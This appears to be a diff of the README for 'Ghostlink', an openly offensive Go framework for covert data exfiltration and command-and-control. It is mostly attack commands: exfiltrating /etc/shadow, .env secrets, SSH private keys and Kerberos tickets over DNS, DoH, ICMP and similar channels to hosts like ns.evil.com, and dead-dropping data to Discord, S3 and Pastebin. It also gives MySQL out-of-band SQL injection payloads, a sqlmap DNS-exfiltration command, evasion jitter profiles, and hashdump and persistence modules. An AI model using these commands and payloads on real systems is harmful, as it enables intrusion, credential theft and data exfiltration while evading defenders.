@@ -1,393 +1,530 @@
-# Ghostlink
+<div align="center">
 
-**Multi-channel OOB data exfiltration framework — 9 covert channels, FEC, dead drops, SQLi payloads, and optional C2.**
+# 👻 `ghostlink`
+### Next-Generation Multi-Channel OOB Data Exfiltration & Covert C2 Framework
 
-[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![Channels](https://img.shields.io/badge/covert_channels-9-green)]()
-[![Encryption](https://img.shields.io/badge/crypto-ECDHE%20%7C%20AES--256--GCM-red)]()
-[![Version](https://img.shields.io/badge/version-1.0-orange)]()
+[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
+[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
+[![Channels](https://img.shields.io/badge/Covert_Channels-9_Engines-00FF66?style=for-the-badge)]()
+[![Crypto](https://img.shields.io/badge/Crypto-ECDHE_P--256_%7C_AES--256--GCM-red?style=for-the-badge)]()
+[![FEC](https://img.shields.io/badge/Reliability-XOR_FEC_Parity-orange?style=for-the-badge)]()
+[![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-Mapped-blueviolet?style=for-the-badge)](https://attack.mitre.org/)
 
-Ghostlink is **not a general-purpose C2**. It's a surgical tool for **getting data out when every other path is blocked**. If Sliver and Cobalt Strike are the army, Ghostlink is the scalpel — specializing in environments monitored by DPI, IDS, and strict firewalls where traditional C2 traffic gets flagged instantly.
+<p align="center">
+  <b>Surgical, low-observable out-of-band data exfiltration and resilient command & control when all standard egress routes are blocked.</b><br>
+  <sub>9 Covert Channels · Forward Error Correction (FEC) · Zero-Infra Dead Drops · SQLi OOB Automation · Adaptive Entropy Selection · Anti-DPI Jitter</sub>
+</p>
+
+<p align="center">
+  <a href="#-the-threat-model-why-traditional-tools-fail"><b>[ Threat Model ]</b></a> &nbsp;•&nbsp;
+  <a href="#-the-9-covert-channels"><b>[ Covert Channels ]</b></a> &nbsp;•&nbsp;
+  <a href="#-architecture--pipeline"><b>[ Architecture ]</b></a> &nbsp;•&nbsp;
+  <a href="#-mitre-attck-matrix"><b>[ MITRE ATT&CK ]</b></a> &nbsp;•&nbsp;
+  <a href="#-quick-start"><b>[ Quick Start ]</b></a> &nbsp;•&nbsp;
+  <a href="#-exfiltration-arsenal"><b>[ Exfiltration ]</b></a> &nbsp;•&nbsp;
+  <a href="#-covert-c2--interactive-operations"><b>[ Covert C2 ]</b></a> &nbsp;•&nbsp;
+  <a href="#-sqli-oob-engine--sqlmap-bridge"><b>[ SQLi Bridge ]</b></a> &nbsp;•&nbsp;
+  <a href="#-comparison"><b>[ Comparison ]</b></a>
+</p>
+
+</div>
 
 ---
 
-## Three modes, one tool
+## ⚡ The Threat Model: Why Traditional Tools Fail
 
-| Mode | Purpose | Command |
-|---|---|---|
-| **Exfil** | Fire-and-forget data exfiltration via 9 covert channels | `-exfil`, `-exfil-glob` |
-| **Dead Drop** | Exfiltrate to 3rd-party services (no C2 server needed) | `-dead-drop` |
-| **C2** | Interactive shell, SOCKS5, port forwarding, modules | `-shell`, `-exec`, `-socks` |
+Enterprise network environments have evolved. Next-Generation Firewalls (NGFW), Deep Packet Inspection (DPI), TLS Interception Proxies, JA3/JA4 fingerprinting, and strict egress ACLs make traditional Command & Control (C2) and data exfiltration high-risk operations.
 
----
+Conventional frameworks (Cobalt Strike, Sliver, Metasploit) excel at post-exploitation in standard networks, but their traffic profiles—persistent HTTPS streams, distinctive TLS handshakes, or high-frequency DNS bursts—trigger immediate heuristics in modern NDR/EDR solutions.
 
-## Architecture
+**Ghostlink is engineered for the worst-case scenario: when every standard egress path is blocked or monitored.**
 
 ```
-                  SENDER                                 RECEIVER
-             ┌──────────────┐                        ┌──────────────┐
-plaintext ──>│ AES-256-GCM  │                        │ AES-256-GCM  │──> plaintext
-             │   encrypt    │                        │   decrypt    │
-             └──────┬───────┘                        └──────^───────┘
-                    │                                       │
-             ┌──────v───────┐                        ┌──────┴───────┐
-             │    zlib      │                        │    zlib      │
-             │  compress    │                        │  decompress  │
-             └──────┬───────┘                        └──────^───────┘
-                    │                                       │
-             ┌──────v───────┐                        ┌──────┴───────┐
-             │ FEC encode   │                        │  FEC decode  │
-             │ (XOR parity) │                        │ (reassemble) │
-             └──────┬───────┘                        └──────^───────┘
-                    │                                       │
-             ┌──────v───────┐                        ┌──────┴─────────┐
-             │ frame split  │                        │frame reassemble│
-             │ (seq + CRC)  │                        │  (seq + CRC)   │
-             └──────┬───────┘                        └──────^─────────┘
-                    │                                       │
-             ┌──────v───────────────────────────────────────┴───────┐
-             │             ADAPTIVE CHANNEL SELECTOR                │
-             │       entropy scoring · failover · rotate            │
-             └──┬────┬────┬────┬────┬────┬────┬────┬────┬──────────┘
-                │    │    │    │    │    │    │    │    │
-                v    v    v    v    v    v    v    v    v
-              DNS  DoH  HTTP   WS  ICMP  ISN  IPID  Time PktSz
+┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                   HARDENED EGRESS ENVIRONMENT                                          │
+│                                                                                                        │
+│   Target Host                 Corporate Perimeter                   Ghostlink C2 / Collector           │
+│   ───────────                 ───────────────────                   ────────────────────────           │
+│        │                               │                                       │                       │
+│        │ 1. Direct TCP/UDP egress      │                                       │                       │
+│        │ ────────────────────────────> ╳ [BLOCKED BY NGFW]                     │                       │
+│        │                               │                                       │                       │
+│        │ 2. TLS Inspection Proxy       │                                       │                       │
+│        │ ────────────────────────────> ╳ [INTERCEPTED / BLOCKED]               │                       │
+│        │                               │                                       │                       │
+│        │ 3. Ghostlink Multi-Path FEC   │                                       │                       │
+│        │    (DNS / DoH / TCP-ISN /     │                                       │                       │
+│        │     ICMP / Timing Stego)      │                                       │                       │
+│        │ ─────────────────────────────>│ 4. Recursive Internal Resolvers      │                       │
+│        │                               │    & Legitimate CDN Gateways          │                       │
+│        │                               │ ─────────────────────────────────────>│ 5. Full Reassembly    │
+│        │                               │                                       │    & SHA-256 Proof    │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+```
+
+- **Surgical Evasion:** Transports payloads over physical and protocol layer anomalies (DNS TXT records, DNS-over-HTTPS RFC 8484, HTTP Cookie/User-Agent smuggling, WebSocket tunnels, ICMP Echo bodies, TCP Initial Sequence Numbers, IPv4 ID fields, packet timing deltas, and packet size modulations).
+- **Forward Error Correction (FEC):** Packet drops over lossy UDP/covert side-channels do not corrupt data. Built-in XOR parity shards enable mathematical reconstruction even under severe channel loss.
+- **Zero-Infrastructure Dead Drops:** Exfiltrate critical files directly to third-party trusted providers (Discord, AWS S3, Pastebin, Webhooks) without provisioning or exposing a single C2 listener.
+- **Cryptographic Forward Secrecy:** Every interactive session generates ephemeral ECDHE P-256 keys followed by AES-256-GCM authenticated encryption with unique nonces per message.
+
+---
+
+## 📡 The 9 Covert Channels
+
+Ghostlink implements nine specialized covert transmission channels designed to match any egress restriction:
+
+| # | Channel | Flag | Layer | Stealth | Throughput | Primary Evasion Target |
+|:---:|:---|:---|:---:|:---:|:---:|:---|
+| **1** | **DNS** | `-channel dns` | L7 (UDP/53) | `0.85` | Medium | Egress firewalls allowing only internal corporate DNS resolvers |
+| **2** | **DoH** | `-channel doh` | L7 (HTTPS/443) | `0.96` | High | Environments inspecting port 53; blends into RFC 8484 DNS over HTTPS |
+| **3** | **HTTP** | `-channel http` | L7 (TCP/80, 443)| `0.90` | High | Corporate web proxies; smuggles data via Cookie / User-Agent headers |
+| **4** | **WebSocket**| `-channel websocket`| L7 (TCP/WS) | `0.92` | High | Environments allowing long-lived interactive browser sessions |
+| **5** | **ICMP** | `-channel icmp` | L3 (Echo Req) | `0.75` | High | Networks filtering TCP/UDP while allowing diagnostic ping probes |
+| **6** | **TCP ISN** | `-channel tcp_isn` | L4 (SYN Packets)| `0.70` | Low (~2B/SYN) | Deep packet inspection analyzing packet payloads (no payload carried) |
+| **7** | **IP ID** | `-channel ip_id` | L3 (IPv4 Hdr) | `0.72` | Low (~2B/pkt) | Gateways stripping L4 payloads but forwarding IPv4 packets |
+| **8** | **Timing** | `-channel timing` | Side-Channel | `0.95` | ~40 bps | Air-gapped / heavily audited perimeters; encodes bits in delay deltas |
+| **9** | **Packet Size**| `-channel packet_size`| Side-Channel| `0.80` | ~300 bps | Networks monitoring packet contents; encodes bits in byte length variations |
+
+---
+
+## 🏗️ Architecture & Pipeline
+
+Ghostlink treats data transmission as a fault-tolerant cryptographic pipeline:
+
+```
+                  SENDER                                              RECEIVER
+      ┌─────────────────────────────┐                     ┌─────────────────────────────┐
+      │     Plaintext / Files       │                     │    Verified Output Data     │
+      └──────────────┬──────────────┘                     └──────────────^──────────────┘
+                     │                                                   │
+      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
+      │   ECDHE / AES-256-GCM       │                     │     AES-256-GCM Decrypt     │
+      │   Authenticated Encryption  │                     │     Integrity Verification  │
+      └──────────────┬──────────────┘                     └──────────────^──────────────┘
+                     │                                                   │
+      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
+      │       zlib Compression      │                     │      zlib Decompress        │
+      └──────────────┬──────────────┘                     └──────────────^──────────────┘
+                     │                                                   │
+      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
+      │      FEC XOR Sharding       │                     │       FEC Reconstruction    │
+      │   (Data + Parity Shards)    │                     │   (Tolerates Missing Shards)│
+      └──────────────┬──────────────┘                     └──────────────^──────────────┘
+                     │                                                   │
+      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
+      │    Frame Sequence & CRC32   │                     │     Frame Reassembly        │
+      └──────────────┬──────────────┘                     └──────────────^──────────────┘
+                     │                                                   │
+      ┌──────────────v───────────────────────────────────────────────────┴──────────────┐
+      │                        ADAPTIVE CHANNEL ROUTER & SELECTOR                       │
+      │              Entropy Scoring · Dynamic Multi-Path · Channel Rotation            │
+      └──────┬─────┬─────┬─────┬─────┬─────┬────────┬────────┬─────────────────────────┘
+             │     │     │     │     │     │        │        │
+             v     v     v     v     v     v        v        v
+           [DNS] [DoH] [HTTP] [WS] [ICMP] [ISN] [IP ID] [Timing / Size]
 ```
 
 ---
 
-## Covert Channels
+## 🎯 MITRE ATT&CK Matrix
 
-| # | Channel | Flag | Technique | Stealth | Throughput |
-|---|---------|------|-----------|---------|------------|
-| 1 | **DNS** | `-channel dns` | TXT query tunneling, base64 labels | 0.85 | High |
-| 2 | **DoH** | `-channel doh` | DNS-over-HTTPS (RFC 8484), bypasses DNS monitoring | 0.96 | High |
-| 3 | **HTTP** | `-channel http` | Cookie/User-Agent header smuggling, browser emulation | 0.90 | High |
-| 4 | **WebSocket** | `-channel websocket` | Persistent bidirectional tunnel, blends with web apps | 0.92 | High |
-| 5 | **ICMP** | `-channel icmp` | Echo request/reply payload embedding | 0.75 | High |
-| 6 | **TCP ISN** | `-channel tcp_isn` | Initial Sequence Number steganography (2 bytes/SYN) | 0.70 | Low |
-| 7 | **IP ID** | `-channel ip_id` | IPv4 Identification field modulation (2 bytes/pkt) | 0.72 | Low |
-| 8 | **Timing** | `-channel timing` | Inter-packet delay encoding (bit0=50ms, bit1=150ms) | 0.95 | ~40 bps |
-| 9 | **Packet-size** | `-channel packet_size` | Payload size modulation (3 bits/pkt) | 0.80 | ~300 bps |
+Ghostlink maps across critical tactics and techniques defined in the MITRE ATT&CK enterprise knowledge base:
+
+| Tactic | Technique | ID | Ghostlink Capability |
+|:---|:---|:---:|:---|
+| **Command & Control** | Protocol Tunneling | [T1572](https://attack.mitre.org/techniques/T1572/) | DNS, DoH, ICMP, and WebSocket bidirectional tunnels |
+| **Command & Control** | Encrypted Channel | [T1573.001](https://attack.mitre.org/techniques/T1573/001/) | Ephemeral ECDHE P-256 key exchange with AES-256-GCM |
+| **Command & Control** | Fallback Channels | [T1008](https://attack.mitre.org/techniques/T1008/) | Dynamic multi-channel hopping (`-hop`) and adaptive failover |
+| **Command & Control** | Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | RFC 8484 DoH query encapsulation and HTTP header smuggling |
+| **Command & Control** | Application Layer Protocol: DNS | [T1071.004](https://attack.mitre.org/techniques/T1071/004/) | Authoritative DNS hierarchy forwarding via recursive resolvers |
+| **Exfiltration** | Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | Chunked, compressed, and encrypted file streaming |
+| **Exfiltration** | Exfiltration Over Alternative Protocol | [T1048](https://attack.mitre.org/techniques/T1048/) | Non-standard protocol modulation (ICMP, TCP ISN, IPv4 ID) |
+| **Exfiltration** | Exfiltration Over Web Service | [T1567.002](https://attack.mitre.org/techniques/T1567/002/) | Serverless dead drop exfiltration (Discord, S3, Pastebin) |
+| **Defense Evasion** | Steganography | [T1027.003](https://attack.mitre.org/techniques/T1027/003/) | TCP SYN Sequence Numbers and packet delay timing stego |
+| **Defense Evasion** | Domain Fronting | [T1090.004](https://attack.mitre.org/techniques/T1090/004/) | CDN SNI camouflage (`-front ajax.googleapis.com`) |
+| **Defense Evasion** | Traffic Signaling | [T1205](https://attack.mitre.org/techniques/T1205/) | Canary tripwire alerting and automated channel self-silencing |
+| **Collection** | Automated Data Collection | [T1119](https://attack.mitre.org/techniques/T1119/) | Glob search with regex content filtering (`-exfil-glob`) |
 
 ---
 
-## Quick Start
+## 🚀 Quick Start
+
+### 1. Installation & Compilation
 
 ```bash
-git clone https://github.com/byjanke/ghostlink && cd ghostlink
-go build -o ghostlink-server ./cmd/server
-go build -o ghostlink-client ./cmd/client
+# Clone the repository
+git clone https://github.com/jankesec/ghostlink.git && cd ghostlink
+
+# Build the C2 Server, Operator Client, and SQLMap Bridge
+go build -ldflags="-s -w" -o ghostlink-server ./cmd/server
+go build -ldflags="-s -w" -o ghostlink-client ./cmd/client
+go build -ldflags="-s -w" -o ghostlink-bridge ./bridge
+
+# (Optional) Compile the ultra-lightweight C Implant (~30KB, zero dependencies)
+gcc -Os -s -o ghostimpl implant/ghostimpl.c
+# Cross-compile C implant for Windows targets:
+# x86_64-w64-mingw32-gcc -Os -s -o ghostimpl.exe implant/ghostimpl.c -lws2_32
+```
+
+### 2. Verify Built-in Test Suite
+
+```bash
+go test -v ./...
 ```
 
 ---
 
-## Exfiltration (Primary Use Case)
+## 📦 Exfiltration Arsenal
 
-### Fire-and-forget file exfiltration
-Sends a file and exits. No shell, no session, just data out.
+Ghostlink provides dedicated exfiltration workflows optimized for speed, stealth, and zero footprint.
+
+### 1. Fire-and-Forget Single File Exfiltration
+Send target files and terminate immediately. Leaves no active listener, no background process, and zero lingering sockets:
 
 ```bash
-# Server
-./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key op
+# Start C2 listener on DNS
+./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key "OperatorPresharedKey"
 
-# Client — single file
-./ghostlink-client -channel dns -addr 10.0.0.5:5353 -key op -exfil /etc/shadow
+# On the target host: exfiltrate /etc/shadow over DNS
+./ghostlink-client -channel dns -addr 10.0.0.5:5353 -key "OperatorPresharedKey" -exfil /etc/shadow
 
-# Server output:
-# [exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4]
+# Server verifies SHA-256 integrity upon arrival:
+# [exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4...]
 ```
 
-### Glob-based exfiltration with content filtering
-```bash
-# Exfiltrate all .env files, keep only lines matching API_KEY or SECRET
-./ghostlink-client -channel http -addr C2:8080 -ecdhe \
-  -exfil-glob "/var/www/**/*.env" \
-  -exfil-filter "API_KEY|SECRET|DATABASE_URL"
+### 2. Recursive Glob Hunting with Regex Content Filtering
+Scan filesystem trees, select files under a maximum size threshold, and extract only lines containing specific patterns (e.g. credentials, tokens, connection strings):
 
-# Exfiltrate all configs under 1MB
+```bash
+# Exfiltrate environment files containing credentials over DoH via Cloudflare:
 ./ghostlink-client -channel doh \
   -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
-  -ecdhe -exfil-glob "/etc/**/*.conf" -exfil-max 1048576
+  -ecdhe \
+  -exfil-glob "/var/www/**/*.env" \
+  -exfil-filter "API_KEY|SECRET|AWS_ACCESS|DATABASE_URL" \
+  -exfil-max 1048576
 ```
 
-### Multi-path exfiltration with Forward Error Correction
-Split a single file across N channels in parallel. Losing any single channel doesn't lose data.
+### 3. Multi-Path Striping with Forward Error Correction (FEC)
+Stripe data across multiple simultaneous channels. If defensive mechanisms sever one or more connections mid-transmission, the XOR parity blocks reconstruct the file seamlessly:
 
 ```bash
-# Uses FEC (8 data + 3 parity shards). Even if 3 channels are blocked, data survives.
+# Split file across DNS, HTTP, ICMP, and WebSocket with parity redundancy:
 ./ghostlink-client -multi-path dns,http,icmp,websocket \
-  -addr C2:5353 -key op -multi-path-fec -exfil large_db.sql
+  -addr C2_HOST:5353 \
+  -key "OperatorPresharedKey" \
+  -multi-path-fec \
+  -exfil internal_database.sql
 ```
 
-### Dead drop exfiltration (zero C2 infrastructure)
-Exfiltrate to public services without a C2 server.
+> [!TIP]
+> **FEC Shard Mechanics:** Automatically scales parity shards based on payload volume (e.g. 4 data + 2 parity for small buffers; 12 data + 4 parity for larger payloads). Up to 33% packet loss is absorbed without retransmission.
+
+### 4. Zero-Infrastructure Dead Drops (No C2 Server Required)
+Exfiltrate directly to trusted third-party cloud infrastructure. All egress traffic appears as legitimate API requests to well-known domains:
 
 ```bash
-# Discord webhook
+# Discord Webhook Dead Drop
 ./ghostlink-client -dead-drop discord \
-  -dead-drop-url "https://discord.com/api/webhooks/xxx/yyy" \
-  -exfil /etc/shadow
+  -dead-drop-url "https://discord.com/api/webhooks/123456789/abcdef..." \
+  -exfil /etc/passwd
 
-# Generic webhook
+# Generic HTTPS Webhook
 ./ghostlink-client -dead-drop webhook \
-  -dead-drop-url "https://your-server.com/collect" \
-  -exfil-glob "/var/www/**/*.env"
+  -dead-drop-url "https://collector.internal-audit.io/hook" \
+  -exfil-glob "/home/*/.ssh/id_*"
 
-# Pastebin
+# Encrypted Pastebin Post
 ./ghostlink-client -dead-drop pastebin \
   -dead-drop-url "https://pastebin.com/api/api_post.php" \
   -dead-drop-key "YOUR_PASTEBIN_API_KEY" \
-  -exfil /tmp/sensitive.txt
+  -exfil /tmp/kerberos_tickets.ccache
 
-# S3
+# Amazon AWS S3 Bucket Storage
 ./ghostlink-client -dead-drop s3 \
-  -dead-drop-bucket "backup-logs" \
+  -dead-drop-bucket "corp-compliance-logs" \
   -dead-drop-region "us-east-1" \
-  -dead-drop-key "AKIAXXX:secret" \
-  -exfil /var/log/auth.log
+  -dead-drop-key "AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" \
+  -exfil /var/log/audit.log
 ```
 
 ---
 
-## SQLi OOB Payload Generator
+## 💉 SQLi OOB Engine & SQLMap Bridge
 
-Generate SQL injection payloads for DNS/HTTP OOB data exfiltration. Supports MySQL, MSSQL, Oracle, PostgreSQL.
+Ghostlink bridges the gap between web application vulnerabilities and covert infrastructure:
 
-```bash
-# Server-side generation
-./ghostlink-server -channel dns -addr 0.0.0.0:5353
+### 1. Built-in SQL Injection Payload Generator
+Generate DNS and HTTP out-of-band payloads on the fly for MySQL, Microsoft SQL Server, Oracle, and PostgreSQL directly inside the C2 console:
 
-# In the c2 console:
-c2> sqli mysql ns.evil.com "SELECT password FROM mysql.user LIMIT 1"
+```text
+c2> sqli mysql ns.evil.com "SELECT user,password FROM mysql.user LIMIT 1"
 
 === MySQL DNS OOB Payloads === (domain: ns.evil.com)
 
-# Method 1: LOAD_FILE (requires FILE privilege, Windows UNC path)
-SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM mysql.user LIMIT 1), '.ns.evil.com\\a'));
+# Method 1: LOAD_FILE (Windows UNC query)
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user,password FROM mysql.user LIMIT 1), '.ns.evil.com\\a'));
 
-# Method 2: Extract all tables
+# Method 2: INTO OUTFILE UNC path
+SELECT * FROM mysql.user INTO OUTFILE CONCAT('\\\\', (SELECT @@version), '.ns.evil.com\\a');
+
+# Method 3: Information Schema Table Enumeration
 SELECT LOAD_FILE(CONCAT('\\\\', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), '.ns.evil.com\\a'));
 ```
 
+### 2. Standalone SQLMap Bridge (`ghostlink-bridge`)
+Capture SQL injection data exfiltrated via SQLMap without configuring external DNS daemons:
+
+```bash
+# Bind the Ghostlink DNS bridge on port 53:
+sudo ./ghostlink-bridge -addr 0.0.0.0:53 -output ./sqli_harvested.txt
+
+# Run SQLMap with DNS exfiltration enabled:
+sqlmap -u "https://vulnerable.target/item?id=1" --dns-domain="ns.evil.com" --dbs
+```
+
 ---
 
-## C2 Features (Interactive Mode)
+## 🕹️ Covert C2 & Interactive Operations
 
-### Authoritative DNS Mode
-Tunnels through the real DNS hierarchy. Works behind corporate firewalls that only allow internal DNS.
+When interactive control is required, Ghostlink provides a rich, resilient multi-session console.
+
+### 1. Authoritative DNS Hierarchy Tunneling
+Traverse segmented corporate environments where hosts can only resolve external names through internal forwarding resolvers:
 
 ```bash
-# C2 server (authoritative NS)
-sudo ./ghostlink-server -domain ns.example.com -addr 0.0.0.0:53
+# Server (Authoritative Nameserver for ns.attacker.com)
+sudo ./ghostlink-server -domain ns.attacker.com -addr 0.0.0.0:53 -ecdhe
 
-# Implant
-./ghostlink-client -domain ns.example.com -exec "whoami; hostname"
+# Implant on internal host (relies entirely on corporate DHCP DNS)
+./ghostlink-client -domain ns.attacker.com -ecdhe -shell
 ```
 
-### Encryption
-| Mode | Flag | Description |
-|---|---|---|
-| **ECDHE** | `-ecdhe` | P-256 key exchange per session. Forward secrecy. |
-| **PSK** | `-key <pass>` | SHA-256 derived key. AES-256-GCM with random 12-byte nonce per message. |
-| **Plain** | *(default)* | No encryption. Raw covert channel only. |
+### 2. Dynamic SOCKS5 Proxy & Port Forwarding
+Pivot through the covert tunnel into internal subnets:
 
-### DNS-over-HTTPS (bypass DNS monitoring)
 ```bash
-./ghostlink-server -channel doh -addr 0.0.0.0:443 -ecdhe
-./ghostlink-client -channel doh -addr http://C2:443 -ecdhe -exec "whoami"
-
-# Via Cloudflare (traffic looks like normal DoH)
-./ghostlink-client -channel doh \
-  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
-  -ecdhe -exec "cat /etc/shadow"
-```
-
-### SOCKS5 Proxy
-```bash
+# Start SOCKS5 proxy listener on the operator host via WebSocket tunnel:
 ./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
-./ghostlink-client -channel websocket -addr C2:8443 -ecdhe -socks 1080
+./ghostlink-client -channel websocket -addr 10.0.0.5:8443 -ecdhe -socks 1080
 
-curl --socks5 127.0.0.1:1080 http://internal.corp:8080/admin
-proxychains nmap -sT -Pn 10.10.10.0/24
+# Route operator tools through the covert channel:
+curl --socks5 127.0.0.1:1080 http://192.168.1.50/admin
+proxychains-ng nmap -sT -Pn -p 22,80,445 192.168.1.0/24
 ```
 
-### Multi-Channel Hopping
-```bash
-./ghostlink-client -hop dns,http,websocket -addr C2:5353 -ecdhe
-# [hop] dns -> http -> websocket -> dns (30s rotation)
-```
-
-### Domain Fronting
-```bash
-./ghostlink-client -channel http -addr C2:443 -ecdhe -front ajax.googleapis.com
-```
-
-### Canary / Tripwire Mode
-Detects channel disruption and auto-responds.
+### 3. Anti-DPI Traffic Normalization & Jitter Profiles
+Shape packet intervals, burst rates, and delays to mirror benign enterprise traffic:
 
 ```bash
-./ghostlink-client -channel dns -addr C2:5353 -key op -canary -exfil /etc/shadow
+# Office hours emulation (sporadic bursts, extended idle periods)
+./ghostlink-client -channel http -addr C2_IP:80 -ecdhe -jitter office
 
-# If DNS monitoring blocks the channel:
-# [canary] channel degraded — switching to backup
-# [canary] channel silent — silencing for 24h
-# [canary] channel dead
+# Ultra low-and-slow profile for long-term persistence
+./ghostlink-client -channel doh -addr C2_IP:443 -ecdhe -jitter low_slow -reconnect -retries 50
 ```
 
-### Beacon Jitter Profiles
+Available Jitter Profiles:
+- `office`: Mimics 9-to-5 knowledge worker browsing patterns.
+- `low_slow`: Extended multi-minute randomized delays to evade SIEM correlation rules.
+- `burst`: Rapid batch transfers followed by dormant periods.
+- `night`: Off-hours background synchronization schedule.
+- `random`: Uniform randomized distribution.
+
+### 4. Canary Tripwire & Self-Destruct / Silence
+Continuous channel health monitoring detect defensive inspection or DNS blackholing:
+
 ```bash
-./ghostlink-client -channel http -addr C2:8080 -ecdhe -jitter office
-./ghostlink-client -channel doh -addr C2:443 -ecdhe \
-  -jitter low_slow -reconnect -retries 50
+./ghostlink-client -channel dns -addr C2_IP:5353 -key "Key" -canary -exfil /etc/shadow
+
+# Canary States:
+# [canary] OK       -> Operational
+# [canary] DEGRADE  -> Packet degradation detected, switching to alternate channel
+# [canary] SILENT   -> Probing detected, entering 24h hibernation
+# [canary] DEAD     -> Hostile response detected, wiping memory footprint
 ```
 
-### Session Persistence
-Auto-reconnect with exponential backoff.
+### 5. Multi-Session Interactive Console
 
-```bash
-./ghostlink-client -channel dns -addr C2:5353 -key op -reconnect -retries 20 -shell
-```
+```text
+  ________    __                  __  ___      __
+ / ____/ /_  / /_  ___  _____/ /_/   /____  / /
+/ / __/ __ \/ __ \/ _ \/ ___/ __/ / / / __ \/ / 
+/ /_/ / / / / /_/ /  __/ /__/ /_/ / / / /_/ / /  
+\____/_/ /_/_.___/\___/\___/\__/_/_/_/ .___/_/   
+   Covert C2 Console v1.0.1         /_/          
 
-### Multi-Session C2 Console
-```
-ghostlink v1.0 | dns | 0.0.0.0:5353 | PSK | proto v2
-[*] waiting for connections...
-[+] session from 10.0.0.5:42891
-[+] session #1 registered
+[*] Channel: dns | Listen: 0.0.0.0:16353 | Crypto: ECDHE-P256 | Proto: v2
+[+] Session #1 established from 192.168.10.45:51284 (Hostname: PROD-DB01)
 
 c2> sessions
-[*] 1 active session(s):
-  * #1 — 10.0.0.5:42891
+  ID   Remote Address           Channel   Status
+  ──   ──────────────           ───────   ──────
+  #1   192.168.10.45:51284      dns       Active (Current)
+  #2   10.200.4.12:49312        doh       Active
 
-c2> exec whoami
-[*] command sent to session #1: whoami
-[result] root
-
-c2> exfils
-[*] 2 exfiltrated files:
-  shadow_1 (1024 bytes)
-  .env_1 (512 bytes)
-
-c2> sqli mysql ns.evil.com "SELECT password FROM mysql.user LIMIT 1"
-```
-
-**Server commands:** `sessions`, `use <id>`, `kill <id>`, `exec <cmd>`, `shell`, `upload`, `download`, `ping`, `modules`, `run`, `sqli`, `exfils`, `help`
-
----
-
-## Proof of Exfil
-
-Every exfiltrated file receives a SHA-256 acknowledgement:
-
-```
-[exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4]
-```
-
-The implant receives: `[exfil] server ack: OK:shadow:a1b2c3d4`
-
----
-
-## Forward Error Correction
-
-Packets lost over UDP-based channels (DNS, ICMP, IP ID, timing) don't corrupt data. XOR-based parity shards enable full data reconstruction.
-
-- 4KB data → 4 data + 2 parity shards (33% redundancy, tolerates 2 lost shards)
-- 100KB data → 12 data + 4 parity shards (33% redundancy, tolerates 4 lost shards)
-- Auto-tuned by data size
-
----
-
-## Post-Exploitation Modules
-
-8 built-in modules: `sysinfo`, `portscan`, `ps`, `netstat`, `env`, `screenshot`, `persist`, `hashdump`
-
-```bash
 c2> run sysinfo
-c2> run portscan 10.10.10.0/24 22,80,443,3389
+[*] Hostname     : PROD-DB01
+[*] OS / Arch    : linux/amd64 (Ubuntu 22.04 LTS)
+[*] User / UID   : root (0)
+[*] Interfaces   : eth0: 192.168.10.45, docker0: 172.17.0.1
+
+c2> run portscan 192.168.10.0/24 22,80,443,3306,5432,6379
 c2> run persist cron /tmp/implant
+c2> download /var/backups/db.sql
+c2> shell
 ```
 
 ---
 
-## C Implant
+## 🧩 Built-in Post-Exploitation Modules
 
-Lightweight C implant (~30KB compiled) with zero dependencies.
+Ghostlink includes 8 in-memory post-exploitation modules requiring zero external tooling:
+
+| Module | Description | Example Invocation |
+|:---|:---|:---|
+| `sysinfo` | OS, kernel, architecture, current user, network interfaces, uptime | `run sysinfo` |
+| `portscan` | In-memory TCP SYN / Connect scanner for internal subnet reconnaissance | `run portscan 10.0.0.0/24 22,80,443,8080` |
+| `ps` | Process enumeration with PID, PPID, user context, and commandline args | `run ps` |
+| `netstat` | Active TCP/UDP listening ports and established sockets | `run netstat` |
+| `env` | Environment variables, secret tokens, and cloud metadata pointers | `run env` |
+| `screenshot` | Multi-platform screen capture (X11 / Wayland / Win32 / macOS CoreGraphics) | `run screenshot` |
+| `persist` | Persistence installer (Cron jobs, systemd units, Windows Registry Run keys)| `run persist cron /path/to/bin` |
+| `hashdump` | Extracts local password hashes and credential material (root/SYSTEM required)| `run hashdump` |
+
+---
+
+## 🔬 Native REST API & Wireshark Dissector
+
+### 1. Automation REST API (`-api`)
+Automate red team engagements or integrate with external orchestration engines:
 
 ```bash
-gcc -Os -s -o ghostimpl implant/ghostimpl.c
-./ghostimpl dns 10.0.0.5 53 ns.evil.com "whoami"
+# Launch C2 with headless management API enabled:
+./ghostlink-server -channel dns -addr 0.0.0.0:16353 -api 127.0.0.1:8888
 ```
 
----
+| Method | Endpoint | Description |
+|:---:|:---|:---|
+| `GET` | `/api/sessions` | List active sessions, remote IP, and transport channels |
+| `GET` | `/api/sessions/{id}` | Retrieve session status and metadata |
+| `POST` | `/api/sessions/{id}/exec` | Execute command on remote agent (`{"command": "id"}`) |
